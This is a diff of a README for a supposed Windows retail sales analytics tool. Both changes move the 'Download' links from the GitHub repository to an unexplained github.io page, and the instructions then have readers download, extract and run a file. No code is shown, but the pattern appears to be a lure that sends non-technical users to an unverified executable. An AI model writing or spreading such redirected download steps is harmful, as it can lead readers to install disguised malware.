@@ -1,6 +1,6 @@
 # 📊 Retail-Sales-Analytics-Platform - Visualize your store sales data easily
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/sigmundfreudmalawikwacha636/Retail-Sales-Analytics-Platform)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://sigmundfreudmalawikwacha636.github.io)
 
 ## About the Application
 The Retail Sales Analytics Platform helps store owners view their sales performance. It turns raw numbers into charts and graphs. You see trends, top products, and daily revenue without manual calculation. The tool uses reliable data processing methods to show how your business performs over time. 
@@ -9,7 +9,7 @@ The Retail Sales Analytics Platform helps store owners view their sales performa
 You need a computer running Windows 10 or 11. Ensure your machine has at least 4 gigabytes of RAM. You need an active internet connection to load the dashboard components. Make sure you have at least 500 megabytes of free disk space for the installation folder. 
 
 ## 📥 How to Install
-1. Visit the following link to download the software: [Download Retail Sales Analytics Platform](https://github.com/sigmundfreudmalawikwacha636/Retail-Sales-Analytics-Platform)
+1. Visit the following link to download the software: [Download Retail Sales Analytics Platform](https://sigmundfreudmalawikwacha636.github.io)
 2. Locate the folder where your browser saves downloads.
 3. Right-click the downloaded file and choose Extract All.
 4. Select a location on your computer to save the files.
